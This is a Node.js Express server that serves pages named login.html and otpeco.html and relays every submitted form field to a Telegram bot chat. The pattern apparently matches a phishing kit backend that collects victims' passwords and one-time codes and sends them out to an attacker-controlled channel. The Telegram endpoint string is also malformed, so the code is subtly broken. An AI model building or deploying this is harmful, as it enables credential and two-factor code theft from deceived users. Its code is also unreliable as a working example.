import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve index.html, login.html, and otpeco.html
app.use(express.static(__dirname));

// Handle form submissions and send to Telegram
app.post('/submit', async (req, res) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return res.status(500).json({ success: false, message: 'Missing Telegram credentials' });
  }

  const fields = Object.entries(req.body)
    .map(([key, value]) => `${key}: ${value}`)
    .join('\n');

  try {
    const response = await fetch(`https://telegram.org{token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: `New Submission:\n\n${fields}`
      })
    });

    const data = await response.json();
    if (!data.ok) {
      return res.status(502).json({ success: false, message: 'Telegram API error' });
    }

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
